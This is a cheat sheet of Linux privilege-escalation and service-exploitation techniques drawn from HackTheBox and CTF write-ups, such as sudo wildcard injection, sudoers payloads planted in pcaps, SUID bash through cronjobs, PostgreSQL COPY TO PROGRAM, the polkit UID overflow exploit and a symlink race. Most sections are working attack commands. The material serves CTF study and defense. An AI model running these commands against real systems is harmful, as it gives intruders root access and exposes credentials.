# Linux Privilege Escalation and Service Exploitation

Techniques from HackTheBox machine writeups covering sudo abuse, service misconfigurations, database exploitation, and credential extraction.

## Table of Contents

- [Sudo Wildcard Parameter Injection via fnmatch (Dump HTB)](#sudo-wildcard-parameter-injection-via-fnmatch-dump-htb)
- [Crafted Pcap for /etc/sudoers.d (Dump HTB)](#crafted-pcap-for-etcsudoersd-dump-htb)
- [Monit confcheck Process Command-Line Injection (Zero HTB)](#monit-confcheck-process-command-line-injection-zero-htb)
- [Apache -d Last-Wins ServerRoot Override (Zero HTB)](#apache--d-last-wins-serverroot-override-zero-htb)
- [Backup Cronjob SUID Abuse (Slonik HTB)](#backup-cronjob-suid-abuse-slonik-htb)
- [PostgreSQL COPY TO PROGRAM RCE (Slonik HTB)](#postgresql-copy-to-program-rce-slonik-htb)
- [PostgreSQL Backup Credential Extraction (Slonik HTB)](#postgresql-backup-credential-extraction-slonik-htb)
- [SSH Unix Socket Tunneling (Slonik HTB)](#ssh-unix-socket-tunneling-slonik-htb)
- [NFS Share Exploitation for Sensitive Data (Slonik HTB)](#nfs-share-exploitation-for-sensitive-data-slonik-htb)
- [PaperCut Print Deploy Privilege Escalation (Bamboo HTB)](#papercut-print-deploy-privilege-escalation-bamboo-htb)
- [Squid Proxy Pivoting to Internal Services (Bamboo HTB)](#squid-proxy-pivoting-to-internal-services-bamboo-htb)
- [Zabbix Admin Password Reset via MySQL (Watcher HTB)](#zabbix-admin-password-reset-via-mysql-watcher-htb)
- [WinSSHTerm Encrypted Credential Decryption (Atlas HTB)](#winsshterm-encrypted-credential-decryption-atlas-htb)
- [sudo file -m Magic File Directory Traversal (OTW Advent 2018)](#sudo-file--m-magic-file-directory-traversal-otw-advent-2018)
- [CVE-2018-19788 — polkit UID Integer Overflow → Systemd RCE (OTW Advent 2018)](#cve-2018-19788--polkit-uid-integer-overflow--systemd-rce-otw-advent-2018)
- [Sudo Glob Path + Symlink Confused Deputy via vim (STEM CTF 2019)](#sudo-glob-path--symlink-confused-deputy-via-vim-stem-ctf-2019)
- [TOCTOU Symlink Swap Race on FileChecker (STEM CTF 2019)](#toctou-symlink-swap-race-on-filechecker-stem-ctf-2019)

---

## Sudo Wildcard Parameter Injection via fnmatch (Dump HTB)

Sudo's `fnmatch()` matches `*` across argument boundaries including spaces, allowing injection of extra flags into a locked-down sudo command.

Example: sudoers rule has `/usr/bin/tcpdump -c10 -w/var/cache/captures/*/[UUID]` — the `*` matches `x -Z root -r/path -w/etc/sudoers.d`

- `-Z root` prevents privilege dropping (file stays root-owned)
- Second `-w` overrides first (tcpdump uses last value)
- `-r` reads from crafted pcap instead of live capture

```bash
sudo /usr/bin/tcpdump -c10 \
  -w/var/cache/captures/x \
  -Z root \
  -r/var/cache/captures/.../crafted.pcap \
  -w/etc/sudoers.d/output_uuid \
  -F/var/cache/captures/filter.uuid
```

**Key insight:** Sudo wildcards use `fnmatch()` without `FNM_PATHNAME`, so `*` matches any characters including spaces and slashes. This means a single `*` in a sudoers rule can match across multiple injected arguments.

---

## Crafted Pcap for /etc/sudoers.d (Dump HTB)

Sudo's yacc parser has error recovery — it skips binary junk lines and keeps parsing for valid entries. Vixie cron, by contrast, rejects the entire file on the first syntax error. Craft a pcap with an embedded sudoers line: `\nwww-data ALL=(ALL:ALL) NOPASSWD: ALL\n`

Avoid `0x0a` (newline) bytes in binary headers: use IPs like 192.168.x.x (not 10.x.x.x) and select ports/timestamps carefully. The valid sudoers entries appear between binary junk lines.

```python
# Payload embedded in each UDP packet
payload = b"\nwww-data ALL=(ALL:ALL) NOPASSWD: ALL\n"
# Avoid 10.x.x.x IPs (0x0a byte = newline in binary headers)
# Use 192.168.1.1/192.168.1.2, ports 12345/9999, timestamps 100-109
```

**Key insight:** Sudo's parser recovers from errors (yacc `error` productions skip to next newline) while cron's parser rejects the entire file on the first syntax error. This makes `/etc/sudoers.d/` a viable target for binary-format file injection while `/etc/cron.d/` is a dead end.

---

## Monit confcheck Process Command-Line Injection (Zero HTB)

Monit runs health-check scripts as root every 60 seconds. The script uses `pgrep -lfa` to find processes matching a regex, extracts their command line, modifies it (e.g., replaces `apache2` with `apache2ctl`), and executes the result as root.

Create a fake process with injected extra flags in its command line. Perl's `$0` assignment sets an arbitrary process name visible to `pgrep`:

```bash
# Monit confcheck script pattern:
# pgrep -lfa "^/opt/app/bin/apache2.-k.start.-d./opt/app/conf"
# -> replaces apache2->apache2ctl, appends -t, executes as root

# Inject extra flags via fake process:
perl -e '$0 = "/opt/app/bin/apache2 -k start -d /opt/app/conf -d /dev/shm/malconf -E /dev/shm/malconf/startup.log"; sleep 300' &
```

**Key insight:** When a root script uses `pgrep` to extract a process command line and then executes a modified version, creating a fake process with extra arguments allows injecting flags into root-executed commands. Perl's `$0` or Python's `setproctitle` make process name spoofing trivial.

---

## Apache -d Last-Wins ServerRoot Override (Zero HTB)

When multiple `-d` flags are specified, Apache uses the last one. Combined with `-E` (startup error log redirect), this provides both config control and output capture. Place `Include /root/root.txt` in a malicious config — Apache tries to parse the flag file as a directive and dumps its content in the error message.

```bash
# Create malicious Apache config
mkdir -p /dev/shm/malconf
cat > /dev/shm/malconf/apache2.conf << 'EOF'
ServerRoot "/etc/apache2"
LoadModule mpm_prefork_module /usr/lib/apache2/modules/mod_mpm_prefork.so
LoadModule authz_core_module /usr/lib/apache2/modules/mod_authz_core.so
Include /root/root.txt
EOF

# Fake process injects -d (override ServerRoot) and -E (error log to readable file)
# After monit triggers confcheck, read error log:
cat /dev/shm/malconf/startup.log
# AH00526: Syntax error on line 1 of /root/root.txt:
# Invalid command 'FLAG_CONTENT_HERE'...
```

**Key insight:** Apache config parse errors expose file content in error messages. `Include /path/to/file` causes Apache to read the file and report its content as an "Invalid command" error — a reliable file-read primitive when combined with `-E` output redirection.

---

## Backup Cronjob SUID Abuse (Slonik HTB)

Root cronjob copies files from a user-controlled directory (e.g., PostgreSQL data directory). Place a SUID (Set User ID) bash binary in the source directory — when the cronjob copies it, the file becomes root-owned while retaining the SUID bit.

```sql
-- Copy bash with SUID to PostgreSQL data directory
COPY (SELECT '') TO PROGRAM 'cp /bin/bash /var/lib/postgresql/14/main/bash && chmod 4777 /var/lib/postgresql/14/main/bash';
-- After backup cronjob runs, the copy at /opt/backups/current/bash is root-owned SUID
-- Execute: /opt/backups/current/bash -p
```

**Key insight:** When a root cronjob copies an entire directory, file ownership changes to root. SUID binaries in the source become root-owned SUID in the destination. The `-p` flag on bash preserves effective UID.

---

## PostgreSQL COPY TO PROGRAM RCE (Slonik HTB)

PostgreSQL superuser can execute OS commands via `COPY TO PROGRAM`. Read command output by writing to a temp file and using `pg_read_file()`.

```sql
-- Execute commands as postgres user
COPY (SELECT '') TO PROGRAM 'id > /tmp/test.txt';
SELECT pg_read_file('/tmp/test.txt');
-- uid=115(postgres) gid=123(postgres)

-- Read arbitrary files
SELECT pg_read_file('/etc/passwd');
SELECT pg_read_file('/var/lib/postgresql/user.txt');
```

**Key insight:** PostgreSQL superuser access is equivalent to OS command execution. `COPY TO PROGRAM` runs shell commands as the `postgres` user, and `pg_read_file()` reads arbitrary files on the filesystem without needing shell access.

---

## PostgreSQL Backup Credential Extraction (Slonik HTB)

`pg_basebackup` archives contain password hashes in `pg_authid` (file `global/1260`). SCRAM-SHA-256 hashes (format: `SCRAM-SHA-256$4096:salt$stored_key:server_key`) can be cracked offline. Restore the backup locally with Docker to access full database contents.

```bash
# Mount NFS share, extract backup zip
showmount -e TARGET && mount -t nfs TARGET:/var/backups /mnt
# Extract pg_authid from global/1260 for password hashes
# Restore backup: docker run -v /path/to/backup:/var/lib/postgresql/data postgres:14
# Connect and dump user tables for credentials
```

**Key insight:** PostgreSQL backups (`pg_basebackup`) contain `global/1260` which holds `pg_authid` -- the table with all password hashes. SCRAM-SHA-256 hashes can be cracked offline, and restoring the full backup in Docker gives access to all database contents including application credentials.

---

## SSH Unix Socket Tunneling (Slonik HTB)

When a service only listens on a Unix socket (not TCP), use SSH local port forwarding to tunnel traffic to it. Works even when the user has `/bin/false` as login shell — the `-T -fN` flags skip terminal allocation and command execution.

```bash
# Forward local port 25432 to remote PostgreSQL Unix socket
sshpass -p 'password' ssh -T -o StrictHostKeyChecking=no \
  -fNL 25432:/var/run/postgresql/.s.PGSQL.5432 user@TARGET
# Connect via forwarded port
PGPASSWORD='postgres' psql -h localhost -p 25432 -U postgres
```

**Key insight:** SSH `-L localport:unix_socket_path` forwards to Unix sockets, not just TCP ports. `-T` prevents terminal allocation, `-f` backgrounds SSH, `-N` prevents command execution — together these work even with restricted shells like `/bin/false`.

---

## NFS Share Exploitation for Sensitive Data (Slonik HTB)

Enumerate and mount NFS (Network File System) shares to find database backups, SSH keys, and config files with credentials:
```bash
showmount -e TARGET
# /var/backups (everyone)
# /home        (everyone)
mount -t nfs TARGET:/var/backups /mnt/backups
mount -t nfs TARGET:/home /mnt/home
# Check for: database backups, SSH keys, config files with credentials
```

**Key insight:** NFS shares exported with `(everyone)` access require no authentication. Always check `showmount -e` early in enumeration -- exposed `/home` directories often contain SSH keys, and `/var/backups` frequently holds database dumps with credentials.

---

## PaperCut Print Deploy Privilege Escalation (Bamboo HTB)

Root-owned systemd service (`pc-print-deploy`) runs binaries from a user-owned directory (`/home/papercut/`). The `server-command` shell script, owned by the `papercut` user, executes as root during certain admin operations. Modify this user-owned script to inject a payload, then trigger execution via admin API.

```bash
# Modify user-owned script that root executes
echo 'chmod u+s /bin/bash' >> ~/server/bin/linux-x64/server-command

# Trigger root execution via PaperCut admin API
curl -c /tmp/cookies.txt "http://localhost:9191/app?service=page/SetupCompleted"
curl -b /tmp/cookies.txt "http://localhost:9191/print-deploy/admin/api/mobilityServers/v2?refresh=true"

# Execute SUID bash
bash -p
```

**Key insight:** When a root-owned service runs binaries or scripts from a user-writable directory, check `ls -la` on every file in the execution path. The systemd service file (`/etc/systemd/system/`) defines `ExecStart` but may lack `User=` directive, running everything as root.

---

## Squid Proxy Pivoting to Internal Services (Bamboo HTB)

Route traffic through a Squid proxy to reach internal services not directly accessible:
```bash
# Enumerate internal services through Squid proxy
curl -x http://TARGET:3128 http://127.0.0.1:9191/app
curl -x http://TARGET:3128 http://127.0.0.1:8080/
# Set proxy for all tools:
export http_proxy=http://TARGET:3128
```

**Key insight:** Squid proxies on port 3128 are a pivot point to internal services bound to 127.0.0.1. Set `http_proxy` globally and access internal admin panels, databases, and APIs that are invisible from external scans.

---

## Zabbix Admin Password Reset via MySQL (Watcher HTB)

With MySQL access to the Zabbix database, reset the admin password directly:
```sql
-- Reset Zabbix admin password to "zabbix" (bcrypt hash)
UPDATE users SET passwd = '$2a$10$ZXIvHAEP2ZM.dLXTm6uPHOMVlARXX7cqjbhM6Fn0cANzkCQBWpMrS' WHERE username = 'Admin';
-- Note: username is case-sensitive ("Admin" not "admin")
```

**Key insight:** With direct MySQL access to a Zabbix database, update the `users` table to set a known bcrypt hash as the admin password. The username is case-sensitive (`Admin` not `admin`), which is a common gotcha.

---

## WinSSHTerm Encrypted Credential Decryption (Atlas HTB)

WinSSHTerm (.NET) stores encrypted SSH credentials in `connections.xml` with key material in a `key` file. Decompile with ILSpy/dnSpy to reverse the multi-layer encryption:

1. **Layer 1:** Key file decrypted with PBKDF2-HMAC-SHA1 (Password-Based Key Derivation Function 2) using 1012 iterations, obfuscated prefix + master password + suffix, and a hardcoded salt
2. **Layer 2:** Decrypted key split into PasswordKey (even bytes, bitwise NOT'd) and SaltKey (odd bytes, NOT'd)
3. **Layer 3:** Stored password decrypted with PBKDF2 derived from PasswordKey/SaltKey
4. Master password often crackable with rockyou.txt
5. XOR obfuscated string table: `data[i] = (data[i] ^ i) ^ 0xAA`

**Key insight:** Desktop SSH clients with "encrypted" credential storage are only as strong as the master password. Decompile the .NET binary, extract the crypto constants, and brute-force the master password. The encryption scheme's complexity is irrelevant if the master password is weak.

---

## sudo file -m Magic File Directory Traversal (OTW Advent 2018)

**Pattern:** Sudoers rule permits `file` with no argument restrictions. `file -m <path>` tells it to read "magic" definitions from a user-specified directory, and it emits filenames from that directory in error messages even when the target is otherwise unreadable.

```bash
sudo -u santa file -m /root/ .
# Error output lists every filename under /root/
```

Chain with `file -m /path/to/file -i -r .` to read file contents into the error channel when the file command tries to compile entries as magic.

**Key insight:** Sudoers audits usually focus on the main binary, not its secondary flags. `file -m`, `tar --to-command`, `find -exec`, and `awk -f` all turn an innocuous sudo rule into directory listing or command execution. Enumerate sudo rules with `sudo -l` and then look up GTFOBins for each entry.

**References:** OverTheWire Advent 2018 — Lostpresent, writeup 12785

---

## CVE-2018-19788 — polkit UID Integer Overflow → Systemd RCE (OTW Advent 2018)

**Pattern:** polkit treated UIDs greater than `INT_MAX` (`2147483647`) as "unknown user" and *skipped* authentication. Create a user with `UID = 4020181224`, then run `systemctl enable --now /path/to/pwn.service` — polkit lets the call through without prompting, and systemd runs the service as root.

```bash
useradd -u 4020181224 -m loluser
su loluser
# ~/pwn.service:
# [Service]
# ExecStart=/bin/bash -c 'cat /root/flag > /tmp/out'
systemctl enable --now /home/loluser/pwn.service
cat /tmp/out
```

**Key insight:** Any integer-based permission check that compares with signed integers breaks for UID > INT_MAX. The patched version of polkit treats invalid UIDs as `root`'s opposite — *always deny*. Remembering the numeric constant 4020181224 lets you spot vulnerable boxes immediately.

**References:** OverTheWire Advent Bonanza 2018 — writeup 12764

---

## Sudo Glob Path + Symlink Confused Deputy via vim (STEM CTF 2019)

**Pattern:** `/etc/sudoers` grants vim on a glob path — `ctf ALL=(root) NOPASSWD: /usr/bin/vim /home/ctf/*/*/HackMe2.txt`. The glob constrains the *pathname*, not the *file it refers to*. Create any matching path as a symlink to `/root/flag.txt` and vim will happily dereference it and open the real target with root privileges.

```bash
# Set up directory tree that matches /home/ctf/*/*/HackMe2.txt
mkdir -p ~/a/b
ln -s /root/flag.txt ~/a/b/HackMe2.txt

# sudo resolves the pathname string, but open() follows the symlink
sudo /usr/bin/vim /home/ctf/a/b/HackMe2.txt
# :!cat % inside vim prints /root/flag.txt contents
```

**Key insight:** Sudoers path matching happens on the literal argv string, but the binary itself dereferences symlinks. Any "edit only this file" sudo rule that uses a wildcard is exploitable this way — not just vim (also `less`, `cat`, `head`, `tail`, `cp`, `chmod`, `truncate`, any tool that open()s the path). Defense requires `secure_path`, absolute paths without globs, and ideally a file-reading helper that calls `realpath()` and checks against an allow-list.

**References:** STEM CTF: Cyber Challenge 2019 — January 8 2014, writeup 13301

---

## TOCTOU Symlink Swap Race on FileChecker (STEM CTF 2019)

**Pattern:** A setuid binary checks a path's ownership/permissions with `stat()` and only then `open()`s it (or vice versa) — the classic Time-Of-Check / Time-Of-Use window. Run two tight loops in parallel: one rapidly alternates a symlink between a dummy file (that passes the check) and `/root/flag.txt` (that the attacker cannot read), the other invokes the checker and greps for the flag marker. Eventually the two line up and the checker reads the flag while it passed validation on the dummy.

```bash
# redirect.sh — swap the symlink forever
while true; do
    ln -sf dummy.txt link
    ln -sf /root/flag.txt link
done &

# runfile.sh — hammer the vulnerable binary; print when it leaks MCA{
while true; do
    ./FileChecker link 2>/dev/null | grep -m1 'MCA{' && break
done
```

Run them concurrently in the same shell (`./redirect.sh &` then `./runfile.sh`) and wait — usually a few seconds to a minute. Tighten the race with `renameat2(RENAME_EXCHANGE)` or a userfaultfd/inotify-synced swap if the loop is too slow.

**Key insight:** Any two-syscall access pattern on a path (e.g. `stat()` then `open()`, `access()` then `fopen()`) is racey. `access(2)` in particular is explicitly documented as unsafe for security decisions. Defense uses `openat()` + `fstat()` on the returned fd, or `O_NOFOLLOW` to reject symlinks entirely. As an attacker, flip the symlink at ~1M ops/sec with a bash loop or a C program using `renameat2`.

**References:** STEM CTF: Cyber Challenge 2019 — Race You, writeup 13376
